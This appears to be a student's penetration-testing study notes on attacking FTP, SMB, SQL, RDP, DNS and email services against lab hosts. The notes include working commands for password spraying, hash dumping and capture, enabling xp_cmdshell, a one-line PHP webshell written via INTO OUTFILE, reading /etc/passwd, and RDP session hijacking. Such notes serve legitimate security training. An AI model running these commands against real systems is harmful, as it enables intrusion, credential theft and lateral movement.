## Concept of Attacks
![[VulnerabliltyDevelopment.png]]
Four categories that occur for each vulnerability.
*Source*
	Performs specific request to a Process where vulnerability gets triggered 
*Process*
	Each Process has a set of is where the vulnerability gets triggered and has a 
*Privileges*
	Specific Set of privileges 
*Destination*
	Each process has a specific task and destination.  ^3162ee

### Source
We can generalize source as the source of information used for specific tasks or processes 

|**Information Source**|**Description**|
|---|---|
|`Code`|This means that the already executed program code results are used as a source of information. These can come from different functions of a program.|
|`Libraries`|A library is a collection of program resources, including configuration data, documentation, help data, message templates, prebuilt code and subroutines, classes, values, or type specifications.|
|`Config`|Configurations are usually static or prescribed values that determine how the process processes information.|
|`APIs`|The application programming interface (API) is mainly used as the interface of programs for retrieving or providing information.|
|`User Input`|If a program has a function that allows the user to enter specific values used to process the information accordingly, this is the manual entry of information by a person.|
### Process
Is about processing information forwarded from the source. 

| **Process Components** | **Description**                                                                                                                                                            |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `PID`                  | The Process-ID (PID) identifies the process being started or is already running. Running processes have already assigned privileges, and new ones are started accordingly. |
| `Input`                | This refers to the input of information that could be assigned by a user or as a result of a programmed function.                                                          |
| `Data processing`      | The hard-coded functions of a program dictate how the information received is processed.                                                                                   |
| `Variables`            | The variables are used as placeholders for information that different functions can further process during the task.                                                       |
| `Logging`              | During logging, certain events are documented and, in most cases, stored in a register or a file. This means that certain information remains in the system.               |
### Privileges
*Priveliges* are present in any system that controls processes. These serve as a type of permission that determines what tasks and actions can be performed on the system. 

|**Privileges**|**Description**|
|---|---|
|`System`|These privileges are the highest privileges that can be obtained, which allow any system modification. In Windows, this type of privilege is called `SYSTEM`, and in Linux, it is called `root`.|
|`User`|User privileges are permissions that have been assigned to a specific user. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.|
|`Groups`|Groups are a categorization of at least one user who has certain permissions to perform specific actions.|
|`Policies`|Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.|
|`Rules`|Rules are the permissions to perform actions handled from within the applications themselves.|

### Destination
Every task has at least one goal that must be fulfilled, the *Destination* is where these goals are fulfilled (Data changed or stored)

|**Destination**|**Description**|
|---|---|
|`Local`|The local area is the system's environment in which the process occurred. Therefore, the results and outcomes of a task are either processed further by a process that includes changes to data sets or storage of the data.|
|`Network`|The network area is mainly a matter of forwarding the results of a process to a remote interface. This can be an IP address and its services or even entire networks. The results of such processes can also influence the route under certain circumstances.|

## Service Misconfigurations
Services often came with default credentials, now are generally prompted for users to enter their own credentials, worth checking.
Once we enum service banner we can then do a search for default credentials. 

### Anonymous Authentication 
Another misconfiguration that may exist is it may be possible to authenticate with no credentials. 

### Misconfigured Access rights.
When accounts have incorrect permissions, Can read/write things they're not meant to.

### Unnecessary Default
Processes may include default files/settings which are usually aimed at usability rather than security. 
In OWASP top 10 
- Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).
- Default accounts and their passwords are still enabled and unchanged.
- Error handling reveals stack traces or other overly informative error messages to users.
- For upgraded systems, the latest security features are disabled or not configured securely.

### Preventing Misconfiguration
- Admin interfaces should be disabled.
- Debugging is turned off.
- Disable the use of default usernames and passwords.
- Set up the server to prevent unauthorized access, directory listing, and other issues.
- Run scans and audits regularly to help discover future misconfigurations or missing fixes.

## Finding Sensitive Information
Sensitive information may include:
- Usernames.
- Email Addresses.
- Passwords.
- DNS records.
- IP Addresses.
- Source code.
- Configuration files.
- PII.

## Attacking FTP
`Nmap` Default scripts include ftp-anon which checks if a ftp server allows anonymous logins. 
We can use `SSH` to get into ftp
#### Misconfigs
*Anonymous Logins*

for anonymous login with `anonymous`
### Protocol Specific Attacks
#### Brute Forcing
***Medusa*** is a brute force tool for ftp servers
`-u Specify user`
`-U Specify User List`
`-P Password File`
`-M Protocol`
`-h hostname/ip`
`Medusa is so slow wtf??`
#### FTP Bounce Attack
Network attack that uses FTP server to deliver outbound traffic to another device on the server. The attacker uses the `PORT` command to trick the FTP connection to running commands and getting information on other devices on the network.

If we are using a FTP server `FTP_DMZ` exposed to the internet, and another device on the same network `Internal_DMZ` not exposed to the internet we can use our connection to `FTP_DMZ` to scan `Internal_DMZ`. 

The `nmap -b` flag is used to perform a bounce attack. 

```shell-session
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

## Attacking SMB 
*Server Message Block* Created for shared access to files and printers across nodes on a network. 
### SMB Enumeration
*NMAP* default scripts `-sC` allow for enumeration on SMB.

### Misconfigurations
*SMB* can be configured to not require authentication, which is called null session. Instead we can log in with no username and password

### Anonymous Authentication
If a smb server does not require a username or password we can get a list of shares, usernames, groups, permissions, policies and services. 

### File Shares
Using `smbclient` 
	`-L` List shares
	`-N` Use null session

`smbmap` is another tool that helps us enumerate network shares and access associated permissions. `smbmap` provides a list of permissions for each shared folder.
`smbmap`
	`-r` recursively explore directories

### Remote Procedure Call (RPC)
we can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf Cheat Sheet

*Enum4Linux* is another utility that supports null sessions and combines all tools to automate common `SMB` enum targets. 
- Workgroup/Domain name
- Users information
- Operating system information
- Groups information
- Shares Folders
- Password policy information

### Protocol Specific Attacks
If null session is not obtainable we will need credentials to interact with the SMB protocol. Two common ways are `Brute Forcing` and `Password Spraying`.

#### Brute Forcing & Password Spraying
Password spraying is a better alternative to bruteforcing as we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold.
`CrackMapExec`

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
### SMB
Linux and Windows `SMB` servers provide different attack paths.
Usually we will only get access to file, system, abuse priveleges, or exploit known vulnerabilities, in a linux environment.

When attacking Windows our actions will be limited by the privileges of the user we compromised. If this user is an admin we will be able to preform:
- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

### RCE 
using `Sysintenals` `PsExec` we can execute powershell processes on other systems. 
It takes the service and deploys it on the `$admin` share then uses `RPC` over `SMB` to access windows service control manager API.
`impacket-psexec`

### CrackMapExec
Can run commands on multiple hosts at the same time. 
`crackmapexec`
	`smb`
	`-u` username
	`-p` password
	`-x` run CMD commands
	`-X` Run powershell commands

```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```

### Enumerating Logged-In Users
`crackmapexec`
	`--loggedon-users`
```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

### Extracting Hashes from SAM Database
*Security account manager* 
- Authenticate as another user.
- Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
- Pass The Hash. We will discuss it later in this section.

```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

### Pass the Hash
`crackmapexec`
	`-H` login using hash

### Forced Authentication Methods
`responder` sets up fake SMB services to steal hashes.
```shell-session
responder -I <interface name>
```

When a system tries to perform name resolution
- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

### RPC
Can use RPC Client to `enumdomuser`
Can use enum4linux

### Forced Authentication Attacks
*Responder*
- The hostname file share's IP address is required.
- The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
- If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
- Is there no local DNS record? A query will be sent to the DNS server that has been configured.
- If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

## Attacking SQL Databases
MySQL databases are relational database management systems using the `SQL` Language.
High interest targets as usually used to store *PII* (`Personally Identifieable Information`).

### Enumeration 
*MSSQL* typically uses port `TCP 1433/UDP 1434` and *MySQL* uses `TCP 3306`.
*MSSQL* can operate in `Hidden Mode` and then will use `TCP 2433`.
`Nmap` scripts can enumerate databases on the target system. 

### Authentication Mechanisms
*MSSQL* supports two types of authentication. 

|**Authentication Type**|**Description**|
|---|---|
|`Windows authentication mode`|This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.|
|`Mixed mode`|Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.|
### MisConfigurations
Anonymous access can be turned on allowing a user to connect without a password.

### Privileges
Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:
- Read or change the contents of a database
- Read or change the server configuration
- Execute commands
- Read local files
- Communicate with other databases
- Capture the local system hash
- Impersonate existing users
- Gain access to other networks

### Protocol Specific Attacks
*SQL Injection*
For ***MSSQL*** use `impacket-mssqlclient`
```shell-session
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```


```cmd-session
SELECT name FROM master.dbo.sysdatabases
```

#### RCE
If we have appropriate privileges we can execute system commands. 
*MSSQL* has `extended storage procedures` called `xp_cmdshell` (Disabled by default).

If `xp_cmdshell` is disabled by default we can enable it with the right priveleges.

```mssql
- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

#### Write Local File 
`SELECT INTO OUTFILE`
could possible be able to write a php shell.

```shell-session
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

```shell-session
show variables like "secure_file_priv";
```

#### Read File
```shell-session
select LOAD_FILE("/etc/passwd");
```
```cmd-session
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

#### Capture MSSQL Service Hash
We can steal the MSSQL Service hash using `xp_subdirs` and `xp_dirtree`  undocumented stored procedures, which use SMB to retrieve a list of child directories under a specified parent directory from the file system. When we point one of these procedures and point it to our smb server, the directory listing functionality will force server to authenticate and send NTLMv2 hash of the service account that is running SQL server.

`Pointed towards responder`
```shell-session
sudo responder -I tun0
```
```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### Impersonating Existing Users with MSSQL
#### Identifying Users we can Impersonate
```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
#### Verifying Current User and Role
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

#### Impersonating the SA User
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

### Communicating with Other Databases with MSSQL
*MSSQL* has a config option  called `linked servers`.
If we gain access to a server which has linked servers we might be able to move laterally.

```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO
```

From the isremote field we can identify if we can connect to the server.
```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```


## Attacking RDP
By default *RDP* `Remote Desktop Protocol` uses `TCP/3389`

### Misconfigurations 
RDP Takes authentication to access so one misconfiguration could be password guessing.
While not common its possible to find a RDP process with a default/no password.

### Password Spraying
To `Password Spray` *RDP* we can use `hydra`
```shell-session
hydra -L usernames.txt -p 'password' 192.168.2.143 rdp
```
We can then log into RDP using xfreerdp

### Protocol Specific Attacks
If we successfully gain access to a machine and have an account with local admin privileges. If a user is connected to RDP to our compromised machine we can hijack the user's remote desktop session.

In an AD environment this could lead to us taking over the Domain Admin account or furthering access to our domain.

#### RDP Session Hijacking
To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use Microsoft `tscon.exe` that enables users to connect to another desktop session.  

We specify the `Session ID` gained from `query user` with our `Session Name`
```cmd-session
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
##### Privilege Escalation
If we have `Local Admin` privileges, we can use several methods to obtain `SYSTEM`.
We can use `Mimikatz` and `PsExec` to create a windows service that by default will run as `Local System` and will execute any binary on `SYSTEM` priveleges.

We can use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. Specifying service name `sessionhijack` and the `binpath` which is the command we want to execute. Once we run the command a service named `sessionhijack` will be created.

```cmd-session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}"
```

To run the service we then start the `sessionhijack` service.
```cmd-session
net start sessionhijack
```

Once the service is started a new terminal with the new user session will appear. We can then use this to further enumerate the network.
***Does not work for windows past Server 2019***

### RDP PTH
We may want to access applications or software installed on the targets windows system that is only available with the GUI.

If we only have a Hash and not a password in some instances we can use PTH

***Caveats***
 `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host.
 
This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.
```cmd-session
 reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use `xfreerdp` with the option `/pth` to gain RDP access

## Attacking DNS
*DNS* is mostly ran on the port `UDP/53` but *DNS* will rely on `TCP/53` for the future. 
*DNS* was always designed to use `TCP & UDP` as default. 
*DNS* Starts communicating on `UDP` and falls back to `TCP` when it cannot communicate with `UDP` reliably.
### Enumeration
*DNS* holds a lot of information on an organisation. 
`nmap` default scripts `-sC and -sV` can be used to perform initial enumeration.
`dig` can also be used.

### DNS Zone Transfer
A *DNS* zone is a portion of *DNS* `Namespace` that a specific organisation or administrator manages. 
*DNS* compromises multiple *DNS* zones, *DNS* server utilize zone transfers to copy a portion of their database to another *DNS* server.
Unless a *DNS* is configured correctly (by limiting which IPs can perform a zone transfer) anyone can ask a *DNS* server for a copy of its zone information since *DNS* zone transfers don't require authentication. 

#### Dig AXFR Zone-Transfer
```shell-session
dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```
`Fierce` can also be used to enumerate all *DNS* servers of the root domain and scan for a *DNZ* `Zone-Transfer`. 

`Fierce --domain`
### Domain Takeovers & Subdomain Enumeration
*Domain Takeover* is registering a non-existent domain to gain control over another domain. If attackers find an expired domain they can claim that domain and perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain.

*Domain Takeover* is also possible with subdomains *Subdomain Takeover*. A *DNS*' cannonical name (`CNAME`) record is used to map different domains to parent domains to a parent domain. Many organisations use a third-party services like AWS, Git and other CDN's to host their content, in this case they create a subdomain and point it to those services. 

```shell-session
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

The domain name (eg. `sub.target.com`) uses a `CNAME` record to another domain ( `anotherdomain.com`). if `anotherdomain.com` expires someone can claim the domain and in that case the person who registers `anotherdomain.com` will have complete control over `sub.target.com` until the *DNS* record is updated.

#### Subdomain Enumeration
*see* [[Recon]]

### DNS Spoofing
`DNS Spoofing` is also referred to *DNS Cache Poisoning*. Attack involves altering legitimate *DNS* records with false information so that they can be used to redirect online traffic to a fraudulent website. 
- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (`MITM`) attack.
- Exploiting a vulnerability found in a *DNS* server could yield control over the server by an attacker to modify the *DNS* records.

#### Local DNS Cache Poisoning 
On a local network an attacker can perform *DNS* Cache poisoning using Man-In-The-Middle tools like [Bettercap](https://www.bettercap.org/).

## Attacking Email Services
*SMTP* (`Simple Mail Transfer Protocol`) can send/receive emails to other mail servers. 
When we download emails to our application it will comment to a `POP3` or `IMAP4` server which allows us to save messages to our inbox and updates them periodically. 

By default `pop3` clients remove downloaded messages from the email server which makes it difficult to access emails on multiple devices. We can typically configure  a `POP3` client to keep copies of downloaded messages on the server.

### Enumeration
Email servers are complex and require the enumeration of multiple servers, ports and services. Most companies now have their email services.
We can use the *Mail Exchanger* (`MX`) *DNS* record to identify the server, its possible to identify more than one `MX` server for load balancing.

We can use `dig` for information about `MX` records.
`dig mx DNS.com`

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|
### Misconfigurations
- Anonymous Authentication.
#### Authentication
*SMTP* server has different commands that can be used to enumerate valid usernames.
`VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password-spray, brute-force, or guess a valid password. 
`VRFY` this command instructs the receiving *SMTP* to check the validity of a particular email username. 

##### VRFY Command
Use telnet to connect to *SMTP* server.
```shell-session
VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data
```

##### EXPN Command
Use telnet to connect to *SMTP* server.
`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

```shell-session
EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

##### RCPT TO Command
`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
```shell-session

RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

##### USER Command
We can use *POP3* protocol to enumerate users depending on the service implementation. 
we can use the `USER` command and server will respond. 
```shell-session
USER julio

-ERR

USER john

+OK
```

To automate the enumeration process we can use [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
```shell-session
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

***When using smtp-user-enum  USE ALL 3***
`VRFY` `RCPT` `EXPN`
### Cloud Enumeration
[O365spray](https://github.com/0xZDH/o365spray) spray is a username enumeration tool aimed at *Office 365*.
We first validate that a domain is using *O365*
```shell-session
python3 o365spray.py --validate --domain msplaintext.xyz
```

We can then enumerate with a username list.
```shell-session
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```

### Password Attacks
We can use *Hydra* to preform a password attack against `SMTP`,`POP3`, or `IMAP4`.
```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```
*Make sure to use @domain.com*
#### O365 Spray - Password Spraying
```shell-session
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```


### Protocol Specific Attack
*SMTP* servers that are intentionally configured as open relays allow mail from any unauthenticated email relay allow mail from any source to be transparently re-routed through the open relay server. This behavior makes the source of messages look like they originate from the open relay.

### Using SMTP
```shell
telnet STMIP 143
11 login "marlin@inlanefreight.htb" "poohbear"
12 select "INBOX"
13 FETCH 1 BODY[]
```
